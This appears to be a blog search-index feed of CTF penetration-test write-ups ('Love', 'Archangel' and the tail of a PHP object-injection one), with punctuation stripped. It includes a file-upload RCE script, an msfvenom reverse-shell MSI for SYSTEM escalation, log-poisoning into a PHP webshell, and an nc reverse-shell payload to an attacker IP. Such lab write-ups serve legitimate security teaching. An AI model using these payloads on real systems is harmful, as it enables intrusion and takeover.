insecure way it deals with this cookie can be seenhighlight php   phpspl  autoload  register function   name     if  preg  match   Model      name    name    models   name        include  once    name  php    if  empty    COOKIE   PHPSESSIDpage   new PageModel   page  file     www index html    setcookie         PHPSESSID         base64  encode serialize  page          time   60  60  24cookie   base64  decode    COOKIE   PHPSESSID     unserialize  cookie   endhighlightAt the very bottom of the file  the function unserialize is performed on the argument  cookie  This would not result in a vulnerability if the cookie could not be modified by the client  However  this was not true for this challenge  and the web server could therefore be exploited   To fix this insecurity  the json  encode   and json  decode   should be implemented instead  Furthermore  input validation must be carried out on the cookie to ensure that it does not contain unexpected data  such as a different file nameAdditionally  the serialized object should be stored in a database with a unique identifier  The unique identifier would then be the value of the cookie  and its associated data could then be safely retrieved thus removing the ability of the client to modify the object s dataConclusionThe web server was vulnerable to a PHP Object Injection attack  This vulnerability can easily be avoided by practicing the secure methods outlined in the  Post Exploitation Analysis   h px1q03fgnzid  section  The following remediations should be immediately observed to ensure that sensitive local files do not get read by untrusted usersSecure the index php fileAs discussed in the previous section  the json  decode   and json  encode   functions should be used instead of the insecure unserialize   functionInsert object data into a database and use a unique identifierThe aforementioned remediations should be followed as soon as possible  as the system is currently prone to being penetrated by a malicious actor1     ftnt ref1   https   github com danielmiessler SecLists blob master Fuzzing LFI LFI gracefulsecurity linux txt  https   www google com url q https   github com danielmiessler SecLists blob master Fuzzing LFI LFI gracefulsecurity linux txt sa D source editors ust 1653962355867511 usg AOvVaw1SPMYbynwMCfbttDS3lLj82     ftnt ref2   https   henkel security com tag log poison   https   www google com url q https   henkel security com tag log poison  sa D source editors ust 1653962355868159 usg AOvVaw2O 0q1WXqSwLb9bDLszG s3     ftnt ref3   https   www phusionpassenger com library admin nginx log  file     text By 20default 2C 20the 20Passenger 20log log 20  https   www google com url q https   www phusionpassenger com library admin nginx log file  23   text 3DBy 2520default 252C 2520the 2520Passenger 2520log log 2520 sa D source editors ust 1653962355868768 usg AOvVaw0OKHORhc0xnKUkVoYWcEW6",
      "image": "/images/toxic.jpg"
    } ,
  
    {
      "title"    : "Love Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/05/21/Love-Writeup/",
      "date"     : "May 21, 2021",
      "content"  : "layout  posttitle   Love Writeupdescription  This Windows box dealt with exploiting an SSRF vulnerability which allowed for the viewing of a sensitive webpage hosted internally on the target  After exploting a vulnerable version of  voting system  software  a shell as a low privileged user was returned  Finally  by taking advantage of an HKLM misconfiguration  a shell as the SYSTEM user could be obtained  namely by installing a malicious MSI packagedate    2021 05 21image     images 0xd4y logo gray png tags     Windows  SSRF  CVE  HKLM  MSIThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Love 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedLoveExploitation of misconfigurations and insecure code    images 0xd4y logo gray png 0xd4yMay 25  20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653797783689836 usg AOvVaw3EtrlB0O5YhUWzWJZPfHF9Email   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653797783690997 usg AOvVaw0Mi5KIOQSTdiZuqNjkSogkTable of ContentsExecutive Summary   h ip86uerwz5x0          2   h ip86uerwz5x0Attack Narrative   h 50z82q6r7ne3          3   h 50z82q6r7ne3Enumeration   h wblb7nvo4vdk          3   h wblb7nvo4vdkPort Enumeration   h msuhfxc2c77t          3   h msuhfxc2c77tHTTP Enumeration   h 19by0voy47mg          5   h 19by0voy47mgSQL Injection  SQLi    h bn9tu0cgpzid          6   h bn9tu0cgpzidAdmin Page   h 4wslswsfx98j          9   h 4wslswsfx98jHTTPS Enumeration   h hwesglv7g5dx          11   h hwesglv7g5dxAbusing beta php   h u9wa319m4pff          11   h u9wa319m4pffReverse Shell   h 627bknqnzbfu          15   h 627bknqnzbfuPrivilege Escalation   h dmxvrwtbagc2          17   h dmxvrwtbagc2Post Exploitation Analysis   h k14bgz5rbsj          19   h k14bgz5rbsjSQL Injection   h t6wmor2q64ua          19   h t6wmor2q64uaBeta php Vulnerability   h rjqnrqcebcxi          19   h rjqnrqcebcxiConclusion   h 1dlgk2gf7eqr          21   h 1dlgk2gf7eqrExecutive SummaryNo prior information was provided for this penetration test except for the IP of the vulnerable machine  This system contains multiple critical vulnerabilities  Along with an SQL injection vulnerability in the root page of the HTTP service  there is an insecure file scanner function within the HTTPS service which was responsible for the leakage of plaintext admin credentials  Additionally  a vulnerable version of Voting System software was installed which allowed for an easy route to returning a reverse shellAfter gaining the reverse shell  the box had a misconfigured group policy  AlwaysInstallElevated  which authorized the installation of packages as SYSTEM  The disabling of antivirus software on this machine facilitated the process of obtaining system privilegesAttack NarrativeEnumerationTo determine the presence of a possible attack vector  it is essential to begin by enumerating the ports of the boxPort EnumerationAlong with enumerating open ports  their services and their versions are also examined using the  sC  for default scripts  and  sV  enumerate version  flagshighlight bash Nmap scan report for 10 10 10 239Host is up  0 065s latencyNot shown  993 closed portsPORT     STATE SERVICE      VERSION80 tcp   open  http         Apache httpd 2 4 46   Win64  OpenSSL 1 1 1j PHP 7 3 27http cookie flags  PHPSESSID     httponly flag not sethttp methodsSupported Methods  GET HEAD POST OPTIONShttp server header  Apache 2 4 46  Win64  OpenSSL 1 1 1j PHP 7 3 27http title  Voting System using PHP135 tcp  open  msrpc        Microsoft Windows RPC139 tcp  open  netbios ssn  Microsoft Windows netbios ssn443 tcp  open  ssl http     Apache httpd 2 4 46  OpenSSL 1 1 1j PHP 7 3 27http server header  Apache 2 4 46  Win64  OpenSSL 1 1 1j PHP 7 3 27http title  403 Forbiddenssl cert  Subject  commonName staging love htb organizationName ValentineCorp stateOrProvinceName m countryName inIssuer  commonName staging love htb organizationName ValentineCorp stateOrProvinceName m countryName inPublic Key type  rsaPublic Key bits  2048Signature Algorithm  sha256WithRSAEncryptionNot valid before  2021 01 18T14 00 16Not valid after   2022 01 18T14 00 16MD5    bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6SHA 1  83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2ssl date  TLS randomness does not represent timetls alpnhttp 1 1445 tcp  open  microsoft ds Windows 10 Pro 19042 microsoft ds  workgroup  WORKGROUP3306 tcp open  mysqlfingerprint stringsDNSVersionBindReqTCP  Help  JavaRMI  LDAPBindReq  LPDString  RTSPRequest  SIPOptions  SSLSessionReq  TerminalServer  afp  ms sql s   Host  10 10 14 138  is not allowed to connect to this MariaDB server5000 tcp open  http         Apache httpd 2 4 46  OpenSSL 1 1 1j PHP 7 3 27http server header  Apache 2 4 46  Win64  OpenSSL 1 1 1j PHP 7 3 27http title  403 ForbiddenHost script resultsclock skew  mean  2h52m30s  deviation  4h02m31s  median  32m28ssmb os discoveryOS  Windows 10 Pro 19042  Windows 10 Pro 6 3 OS CPE  cpe  o microsoft windows 10   Computer name  LoveNetBIOS computer name  LOVEx00Workgroup  WORKGROUPx00System time  2021 05 07T14 50 29 07 00smb security modeaccount used  guestauthentication level  userchallenge response  supportedmessage signing  disabled  dangerous  but default smb2 security mode2 02   Message signing enabled but not requiredsmb2 timedate  2021 05 07T21 50 28start date  N A    endhighlight   Nmap detected this as a Windows box from the SMB service  Additionally  there are two HTTP services open  one on port 80  and a peculiar one on port 5000  Upon attempting to access the HTTP service on port 5000  the scan was met with a 403 error  Interestingly  this box is running Apache which is uncommon for the Windows operating system  this box is running Windows 10 pro 19042 which was detected through SMB   On port 443 there is an HTTPS service whose certificate leaks the domain name of staging love htb  Additionally  there is a mysql service  but remote connections are disabledThe services running on each port do not appear to be outdated  and there are most likely no CVEs to take advantage of  Therefore  the penetration test will start by accessing the HTTP page  as web services tend to have a bigger attack surface than other servicesHTTP EnumerationVisiting the page on 10 10 10 239  the server responds with a simple login page reports Love image13 png Attempting to login with common default credentials does not work reports Love image10 png However  a useful error message pops up that says  Cannot find voter with the ID   Accordingly  it may be viable to attain usernames by brute forcing ID s SQL Injection  SQLi A common vulnerability among login pages is SQLi  so it makes sense to attempt this on the webpage reports Love image12 png  Upon inputting a SQL query into the username field  an  Incorrect password  message pops up instead of  Cannot find voter with the ID   Judging from this output  it is likely that this webpage is vulnerable to SQLihighlight bash    0xd4y Writeup     business hackthebox easy windows love  sqlmap  r login burp   batch   dump                                                                                                                                                                                                                                                                                                            H                                                                                                                                                                                1 4 10 stable                                                                                                                                                                                                                                                                                                          legal disclaimer  Usage of sqlmap for attacking targets without prior mutual consent is illegal  It is the end user s responsibility to obey all applicable local  stateand federal laws  Developers assume no liability and are not responsible for any misuse or damage caused by this programstarting   17 47 39  2021 05 26                                                                                                                                        17 47 39   INFO  parsing HTTP request from  login burp17 47 40   WARNING  provided value for parameter  login  is empty  Please  always use only valid parameter values so sqlmap could be able to run properly17 47 40   INFO  resuming back end DBMS  mysql17 47 40   INFO  testing connection to the target URLgot a 302 redirect to  http   10 10 10 239 80 index php   Do you want to follow   Y n  Yredirect is a result of a POST request  Do you want to resend original POST data to a new location   Y n  Ysqlmap resumed the following injection point s  from stored sessionParameter  voter  POSTType  time based blindTitle  MySQL    5 0 12 AND time based blind  query SLEEPPayload  voter a  AND  SELECT 5793 FROM  SELECT SLEEP 5   bSGe  AND  YMSl   YMSl password a loginDatabase  votesystemTable  admin1 entryid   photo    lastname   password                                                       username   firstname   created on1    nc exe   Devierte    2y 10 4E3VVe2PWlTMejquTmMD6 Og9RmmFN K5A1n99kHNdQxHePutFjsC   admin      Neovic      2018 04 02endhighlightUsing time based bline SQLi  sqlmap successfully retrieved the contents of the SQL server with the credentials of admin  However  admin s password is hashed using blowfish encryption which takes a long time to decrypt  and as it turns out admin s password is not in rockyou Admin PageAlong with enumerating the SQL server  the directories of the web service were also enumerated using gobuster  1    ftnt1highlight bash  admin  Status  301aux php  Status  403aux  Status  403con php  Status  403con  Status  403dist  Status  301home php  Status  302images  Status  301includes  Status  301index php  Status  200licenses  Status  403login php  Status  302logout php  Status  302phpmyadmin  Status  403plugins  Status  301preview php  Status  302prn php  Status  403prn  Status  403server status  Status  403tcpdf  Status  301webalizer  Status  403    endhighlightThe  admin directory in particular stands out as a potentially interesting directory  The page on this directory  however  looks exactly like the one on the root directory reports Love image8 png Nevertheless  this web page functions differently as the error message differs from  Cannot find voter with the ID   In any case  this error may hint at a potential username leak via brute forcing usernames  Attempting to use default credentials such as admin password results in an  Incorrect Password  error message reports Love image6 png Therefore  it is highly likely that there is an account with the username of  admin   the SQLi dump also supports thisHTTPS EnumerationAfter enumerating the HTTP service  the HTTPS web page is still left for examination  Before being able to visit the web page  it is essential to first add the domain name found by Nmap  staging love htb  to the  etc hosts file  After doing so  it is possible to visit the web page reports Love image15 png This service appears to be made for scanning files  To the right is a potentially interesting  Sign up  box which could potentially be interesting to test out for an XSS attack  At the top left of the web page are two links  Home  a link leading to the root directory  and Demo  a link which leads to beta php Abusing beta phpUpon clicking Demo  we are met with the following page reports Love image5 png The file scanner  which goes by the name of beta php  expects a url and performs a GET request on the specified file  This can be abused by using the file     prefix to access local files  Seeing as this box is running a Windows Apache server  it is likely there is a web page hosted on C  xampp htdocs omrs index php reports Love image11 png This code can further be inspected using the html source code  inspect element  featureformhighlight php   php session start    if isset   SESSION  admin        header  location  admin home php   if isset   SESSION  voter header  location  home php   php include  includes header phpbody class  hold transition login pagediv class  login box  div class  login logo        b Voting System  b    div   div class  login box body      p class  login box msg  Sign in to start your session  p     form action  login php  method  POST            div class  form group has feedback              input type  text  class  form control  name  voter  placeholder  Voter s ID  required             span class  glyphicon glyphicon user form control feedback    span            div       div class  form group has feedback          input type  password  class  form control  name  password  placeholder  Password  required         span class  glyphicon glyphicon lock form control feedback    span        div           div class  row              div class  col xs 4                    button type  submit  class  btn btn primary btn block btn flat  name  login   i class  fa fa sign in    i  Sign In  button              div            div      form    div    php     if isset   SESSION  error              echo                div class  callout callout danger text center mt20                    p     SESSION  error      p                div                     unset   SESSION  error    divphp include  includes scripts php     endhighlightAfter enumerating multiple potentially sensitive files  nothing interesting was found  Furthermore  attempts to perform a log injection   poisoning attack  2    ftnt2  were unsuccessful Looking back at the Nmap scan  a peculiar HTTP service running on port 5000 was found  However  this service could not be accessed due to the 403 Forbidden error  Nevertheless  due to this file scanner having the functionality of making GET requests  this page could indirectly be accessed through forcing the file scanner to make a request to this service reports Love image14 png After completing the request  credentials to a user by the name of admin are leaked  Piecing this information together with the  Admin Page   h 4wslswsfx98j  found during the HTTP enumeration  it follows that we can login as the administrator  Using the credentials of admin  LoveIsInTheAir      the user s account could successfully be accessed reports Love image7 png The result is a page with many different functionalities  but nothing interesting appeared  At the bottom of the page is a copyright from 2018 assigned to a website called SourcecodesterReverse ShellAfter researching  Voting System sourcecodester  on Google  results related to an RCE exploit via a file upload pop upThe exploit works due to improper sanitization of image files  To upload a php shell as an image file  the exploit simply modifies the data of the POST request to replicate an image file reports Love image1 png Note the  image png  lineOnce this malicious file is uploaded  a GET request is performed on the file located in the  votesystem images directory  In the context of this box  the  votesystem directory does not exist  and the script needs to be modified to remove the  votesystem stringhighlight python import requests      Edit your settings here     IP    10 10 10 239    Website s URLUSERNAME    admin   Auth usernamePASSWORD     LoveIsInTheAir        Auth PasswordREV IP    10 10 14 111    Reverse shell IPREV PORT    9001    Reverse port                                  INDEX PAGE   f http    IP  admin index php LOGIN URL   f http    IP  admin login php VOTE URL   f http    IP  admin voters add php CALL SHELL   f http    IP  images shell phppayload   payload replace  IIPP   REV IP payload   payload replace  PPOORRTT   REV PORTdef sendPayload      if login          global payload       payload   bytes payload  encoding  UTF 8         files      photo    shell php  payload                     image png     Content Disposition    form data   data                firstname   a              lastname   b              password   1              add                 r   s post VOTE URL  data data  files files        if r status code    200          print  Poc sent successfully         else          print  Error    def callShell      r   s get CALL SHELL  verify False    if r status code    200        print  Shell called check your listiner  print  Start a NC listner on the port you choose above and run     sendPayload  callShell   endhighlightSome code was removed to not clutter up this reportKey parts of the exploit can be seen above  Note the modification of the variables toward the top of the page as well as the URL  Now  executing the script results in a reverse shell as the user phoebe reports Love image2 png Privilege EscalationAfter obtaining a shell as the user phoebe  the next task is to escalate to Administrator or SYSTEM reports Love image4 png From the output it can be seen that winPEAS detected a misconfiguration in the AlwaysInstallElevated group policy  By default  this policy is set to 0  and it is extremely dangerous to modify this value  When this policy is set to 1  Microsoft Windows Installer Packages  MSI  are installed with system privileges  Therefore  a malicious MSI file that returns a reverse shell can be used to get a shell as the SYSTEM usermsfvenom  p windows meterpreter reverse tcp LHOST 10 10 10 14 111 LPORT 9001  f msi   0xd4y msiAfter downloading the malicious MSI file onto the box  it is important to start up a multi handler on msfconsole before executing it  Upon downloading the file and setting up the msfconsole listener  the msi file can be executed using the msiexec command  a command responsible for installing  modifying  and performing operations on Windows Installer  3    ftnt3msiexec  quiet  qn  i 0xd4y msi reports Love image3 png A shell is then returned as the system userPost Exploitation AnalysisSQL InjectionThe SQL injection led to the leakage of the Admin password hash  This was due to the lack of user input sanitization  The following code snippet was taken from C xampphtdocsomrslogin php  and is running on the root page of http   10 10 10 239highlight php if isset   POST  login                 voter     POST  voter                                                   password     POST  passwordsql    SELECT   FROM voters WHERE voters id     voter                 query    conn  query  sql      endhighlight   This piece of code was responsible for the SQLi  Note the user query is passed directly into the sql variable  which is used during the connection to the internal SQL server  The user input is passed into the voter variable which is surrounded by single quotes in the SQL query  This was the reason for the SQLi working upon prepending a single quote to the beginning of the input  Note that this same vulnerability is present within C xampphtdocsomrsadminlogin phpBeta php VulnerabilityThe beta php file located at C xampphtdocsFFSbeta php was responsible for the initial foothold on the box  The code performs the curl function on the user query  but does not first check it for potentially malicious characters or stringshighlight php if isset   POST  read                                                     file trim   POST  file              curl   curl init                                                                    curl setopt   curl  CURLOPT URL   file                           curl exec   curl                         curl close   curlendhighlightHardening this code will require a blacklist which should contain strings such as file  to prevent file      and localhostConclusionThis Windows system contained multiple vulnerabilities  The foothold on the machine started with an insecure file scanner feature located on the HTTPS server  The file scanner fails to sanitize user input  Thus  sensitive files located locally on the system could be read using the file     delimiter at the beginning of the query  Furthermore  sensitive services which are not able to be accessed by outside users  can be accessed by forcing the file scanner to perform a query on itselfA vulnerable version of Voting System software was installed which resulted in the ability to upload malicious PHP files to get a reverse shell  After obtaining a reverse shell  it was found that the box has a misconfiguration relating to the installation feature of Windows  and the enabled AlwaysInstallElevated group policy resulted in the privilege escalation to SYSTEM  The following remediations should be seriously consideredHarden SQL code in login phpSanitize user query  character escaping  blacklist characters  validate input Use stored procedures or parameterized queriesPerform sanitization on user query in the beta php fileUpdate Voting System softwarePoor validation within an image file upload feature resulted in the successful upload of malicious PHP to get a reverse shellModify AlwaysInstallElevated policyEnabling this group policy resulted in escalating privileges from a local account to SYSTEMThis policy should be changed from 1 to 01    ftnt ref1   https   github com OJ gobuster  https   www google com url q https   github com OJ gobuster sa D source editors ust 1653797783782138 usg AOvVaw0cPtGGMIRnJTXphEo5G4y62    ftnt ref2   https   owasp org www community attacks Log Injection  https   www google com url q https   owasp org www community attacks Log Injection sa D source editors ust 1653797783783115 usg AOvVaw0vjegYg7h fRsbQvX2GpfN3    ftnt ref3   https   docs microsoft com en us windows server administration windows commands msiexec  https   www google com url q https   docs microsoft com en us windows server administration windows commands msiexec sa D source editors ust 1653797783783679 usg AOvVaw3LvA2X25v kmvKWMfYpmG",
      "image": "/images/Love.png"
    } ,
  
    {
      "title"    : "Archangel Writeup",
      "category" : "",
      "tags"     : "",
      "url"      : "/2021/04/30/Archangel-Writeup/",
      "date"     : "Apr 30, 2021",
      "content"  : "layout  posttitle   Archangel Writeupdescription  This box is a great introduction to the exploitation of a web server  It involves exploiting a web service through an LFI vulnerability and upgrading that to an RCE exploit via log poisoning  The method of escalating to root privileges is also instructive date    2021 04 30image     images 0xd4y logo gray png tags     LFI  Log Poisoning  RCE  Binary ExploitationThis report can be read both on this site  and as its  a href    https   0xd4y.com reports Archangel 20Writeup pdf  original report form  a   It is highly recommended that you read the original report form instead because it is better formattedArchangelA report on the exploitation of a vulnerable web server    images 0xd4y logo gray png 0xd4yApril 30  20210xd4y WriteupsLinkedIn   https   www linkedin com in segev eliezer   https   www google com url q https   www linkedin com in segev eliezer  sa D source editors ust 1653795832240818 usg AOvVaw2IpIFJm61 7CrdpYJ1uw37Email   0xd4yWriteups gmail com  mailto 0xd4yWriteups gmail comWeb   https   0xd4y.com   https   www google com url q https   0xd4y.com Writeups  sa D source editors ust 1653795832241402 usg AOvVaw3RIJaDXx3t4KH5g9bRgjZOTable of ContentsExecutive Summary   h 294g4biierlp          2   h 294g4biierlpAttack Narrative   h 1v4pnj65xmth          3   h 1v4pnj65xmthReconnaissance   h 5u2vk3e7kgnj          3   h 5u2vk3e7kgnjPort Enumeration   h wbbcinqjysb2          3   h wbbcinqjysb2Exploiting the Web Server   h 3ze1wupj2899          4   h 3ze1wupj2899Web Enumeration   h pdief5tmjeq4          4   h pdief5tmjeq4Local File Inclusion   h 9wuhc1aj58h7          5   h 9wuhc1aj58h7Log Poisoning   h qdzu2aalbf2          8   h qdzu2aalbf2Horizontal Privilege Escalation   h c8ig29aegdk6          12   h c8ig29aegdk6Root Privilege Escalation   h 86wwt9vgzi00          13   h 86wwt9vgzi00Binary Exploitation   h pue60l7cthuj          14   h pue60l7cthujReverse Engineering   h 6tkff53mhtz6          14   h 6tkff53mhtz6Command Injection   h sawpdgpmtqpi          14   h sawpdgpmtqpiConclusion   h gs1ewfmvc73g          16   h gs1ewfmvc73gExecutive SummaryThe attack performed on the target as outlined in this report was conducted without prior knowledge of anything about the client s machine except for its IP address  This was done so as to mimic a real attack from a person of malicious intent  The client s system contained multiple vulnerabilities ranging from local file inclusion to misconfigurations and an insecure SETUID binary  This machine was successfully compromised by exploiting an insecure PHP script to get a reverse shell as a low privileged user  after which we were able to horizontally escalate privileges to a user on the system who had access to a vulnerable SETUID running as root  After the exploitation of this binary  we were able to successfully gain full privileges as root on the Archangel system  The client is highly encouraged to patch the system with the remediations outlined in the  Conclusion   h gs1ewfmvc73g  sectionAttack NarrativeWe are given the IP of the target machine  The first step to finding any vulnerability is always reconnaissanceReconnaissanceBefore performing any kind of enumeration  it is essential to start with port enumeration  This will allow us to find possible attack vectorsPort EnumerationWe can enumerate the ports of the machine with nmap  sC  default scripts   sV  version detectionhighlight bash   Nmap 7 91 scan initiated Sat May  1 01 38 36 2021 as  nmap  sC  sV  oA nmap nmap 10 10 72 16Nmap scan report for archangel thm  10 10 72 16Host is up  0 24s latencyNot shown  998 closed portsPORT   STATE SERVICE VERSION22 tcp open  ssh     OpenSSH 7 6p1 Ubuntu 4ubuntu0 3  Ubuntu Linux  protocol 2 0ssh hostkey2048 9f 1d 2c 9d 6c a4 0e 46 40 50 6f ed cf 1c f3 8c  RSA 256 63 73 27 c7 61 04 25 6a 08 70 7a 36 b2 f2 84 0d  ECDSA 256 b6 4e d2 9c 37 85 d6 76 53 e8 c4 e0 48 1c ae 6c  ED25519 80 tcp open  http    Apache httpd 2 4 29   Ubuntuhttp server header  Apache 2 4 29  Ubuntuhttp title  WavefireService Info  OS  Linux  CPE  cpe  o linux linux kernel   endhighlightThe nmap scan only detected two open ports  ssh on port 22 and http on port 80   Both services are up to date  so there are no CVEs  Common Vulnerabilities and Exposures  associated with themExploiting the Web ServerWeb EnumerationSeeing as http is open  we can visit the website to find potential vulnerabilities reports Archangel image1 png After browsing around the web page and running a gobuster scan on it  nothing interesting came into view  However  in the front page of the website is an email reports Archangel image2 png Most notably  we can see the domain of the email as mafialive thm  Adding this domain to our  etc hosts file and visiting the website at mafialive thm  we are met with the following webpage reports Archangel image5 png The website seems to be a simple HTTP server  There may be some interesting files   directories that can be revealed using a gobuster scanhighlight bash    0xd4y Writeup     business tryhackme easy linux archangel lfi  gobuster dir  u http   mafialive thm  w  opt SecLists Discovery Web Content raft small words txt  x phpGobuster v3 0 1by OJ Reeves   TheColonial    Christian Mehlmauer    FireFartUrl             http   mafialive thmThreads         10Wordlist         opt SecLists Discovery Web Content raft small words txtStatus codes    200 204 301 302 307 401 403User Agent      gobuster 3 0 1Extensions      phpTimeout         10s2021 05 02 04 34 46 Starting gobusterphp  Status  403html  Status  403html php  Status  403htm  Status  403htm php  Status  403test php  Status  200    endhighlightThe scan found an interesting file by the name of test php  Visiting this PHP file and clicking on the button  we are met with the following webpage reports Archangel image9 png We can see that there is a view parameter in the URL with the full path of a PHP file called mrrobot php  This full path is a hint that there may be an LFI  Local File Inclusion  vulnerability within the test php scriptLocal File InclusionWe can verify this by seeing if we can convert the PHP file to base64 in order to read its source code  Using the PHP base64 filter on the mrrobot php file  we can see the following outputURLhttp   mafialive thm test php view php   filter convert base64 encode resource  var www html development testing mrrobot phpOutput reports Archangel image3 png Expectedly  the output of this URL is a base64 string relating to the source code of the mrrobot php file  Decoding this string we see the followinghighlight bash    0xd4y Writeup     business tryhackme easy linux archangel       echo  n  PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8 Cg     base64  d  php echo  Control is an illusion      endhighlightAlthough we were able to verify the LFI vulnerability by converting the mrrobot php file into base64  we were unsuccessful in including  etc passwd  even though it is a globally readable file by defaultURLhttp   mafialive thm test php view  var www html development testing mrrobot php                      etc passwdOutput reports Archangel image7 png The webpage provides an error message that says  Sorry  Thats not allowed   Judging by this error message and the unsuccessful attempt at including the targeted file  we can conclude that there is a filter inside the test php script that is detecting attempts at including local files  Implementing the same methodology that we used to read the source code for the mrrobot php file  we can view the source code of the test php filehighlight bash        0xd4y Writeup     business tryhackme easy linux archangel       echo  n  CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E PGJyPgogICAgICAgIDw cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8 CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg    base64  d   test php   endhighlightAfter decoding the base64 data  we are met with the contents of the test php file s source codehighlight php   DOCTYPE HTML  htmlhead     title INCLUDE  title     h1 Test Page  Not to be Deployed  h1      button   a   a href   test php view  var www html development testing mrrobot php   button id  secret  Here is a button  button   a  br          php              FLAG  thm explo1t1ng lf1            function containsStr  str   substr                  return strpos  str   substr      false                         if isset   GET  view                 if  containsStr   GET  view                containsStr   GET  view      var www html development testing                        include   GET  view               else                 echo  Sorry  Thats not allowed                   div      body   html    endhighlightWe can see that the PHP file is looking for the strings         and  var www html devleopment testing exist in the URL   More precisely  if there is a         string in the URL or the URL does not have  var www html development testing  then the detection will trigger  We can bypass this by using          which functions just likeURLhttp   mafialive thm test php view  var www html development testing                         etc passwdOutput reports Archangel image10 png The payload successfully works  and we are able to include any local file that we have read permissions to  From the  etc passwd file  we see that there is a local user by the name of archangel  Seeing as there is an open ssh port on the box  I tried to read the user s private ssh key to login as the user  However  the attempt to include this file proved to be unsuccessful  this may be due to us not having proper permissions  or the archangel user may not have a private ssh keyAlthough we can include sensitive files on the vulnerable system  it is necessary to convert this LFI vulnerability to an RCE  Remote Code Execution  vulnerability in order to get a shell on the target Log PoisoningThis can be done by log poisoning  1    ftnt1   Looking back at the results of the  nmap scan   h 5u2vk3e7kgnj   we can see that the http service is running the Apache version  It follows that there is most likely an apache log file at  var log apache2 access log which can be leveraged to gain RCE  After verifying the existence of this file  I used netcat to poison the log filehighlight bash    0xd4y Writeup     business tryhackme easy linux archangel             nc mafialive thm 80GET    php phpinfo                                           HTTP 1 1 400 Bad RequestDate  Sat  01 May 2021 02 27 27 GMTServer  Apache 2 4 29  Ubuntu                                                         Content Length  301  Connection  close                                                                    Content Type  text html  charset iso 8859 1                                                                                     DOCTYPE HTML PUBLIC     IETF  DTD HTML 2 0  EN              html  head               title 400 Bad Request  title      head  body             h1 Bad Request  h1                 p Your browser sent a request that this server could not understand  br                p                   hr                   address Apache 2 4 29  Ubuntu  Server at localhost Port 80  address   body   html                               endhighlightWe can confirm if this attempt was successful by including this log file and viewing the output of the webpage reports Archangel image6 png Seeing as the log file outputs the PHP info  we can conclude that the malicious GET request succeeded  and the PHP code was executed on the web server  Therefore  we can send another GET request to create a PHP webshellhighlight bash        0xd4y Writeup     business tryhackme easy linux archangel       nc mafialive thm 80GET    php system   GET  cmd      HTTP 1 1 400 Bad RequestDate  Sat  01 May 2021 02 34 25 GMTServer  Apache 2 4 29  Ubuntu Content Length  301Connection  closeContent Type  text html  charset iso 8859 1DOCTYPE HTML PUBLIC     IETF  DTD HTML 2 0  EN   html  head  title 400 Bad Request  title   head  body  h1 Bad Request  h1  p Your browser sent a request that this server could not understand  br     p  hr  address Apache 2 4 29  Ubuntu  Server at localhost Port 80  address   body   html    endhighlightWe can now get a reverse shell by sending the following payloadPayloadhttp   mafialive thm test php view  var www html development testing                             var log apache2 access log cmd rm  2Ftmp 2Ff 3Bmkfifo  2Ftmp 2Ff 3Bcat  2Ftmp 2Ff  2Fbin 2Fsh  i 2 3E 261 nc 10 2 29 238 9001  3E 2Ftmp 2FfNote that a url encoded netcat reverse shell was usedThe revshell  2    ftnt2  tool was used to create the reverse shell payload  and we are able to get a shell as the www data user reports Archangel image4 png Horizontal Privilege EscalationWith a low privileged shell  we are unable to execute any commands that may lead to a privilege escalation  However  we can exploit misconfigurations on the server to potentially escalate privileges  The local user  archangel  may have some files that we have access to that could potentially lead to us compromising his or her account  We can enumerate all the files that this user owns on the local system with the following commandhighlight bash www data ubuntu  home archangel  find    user archangel 2  dev null opt helloworld sh opt backupfiles home archangel home archangel  selected editor home archangel  local home archangel  local share home archangel  profile home archangel secret home archangel user txt home archangel myfiles home archangel  cache home archangel  bash logout home archangel  bashrc   endhighlightWe can see a potentially interesting file by the name of  secret   however this file was a rabbit hole  There are two other interesting findings located in the  opt directory  Going into this directory and looking at the permissions of the helloworld sh file  we see that we have full privileges on this filehighlight bash www data ubuntu  opt  ls  latotal 16drwxrwxrwx  3 root      root      4096 May  1 08 23  drwxr xr x 22 root      root      4096 Nov 16 15 39   drwxrwx     2 archangel archangel 4096 Nov 20 15 04 backupfiles rwxrwxrwx  1 archangel archangel  66 May  1 08 22 helloworld sh   endhighlightFurthermore  we can see from  etc crontab that there is a cronjob executing it as the archangel userhighlight bash www data ubuntu  opt  cat  etc crontab   etc 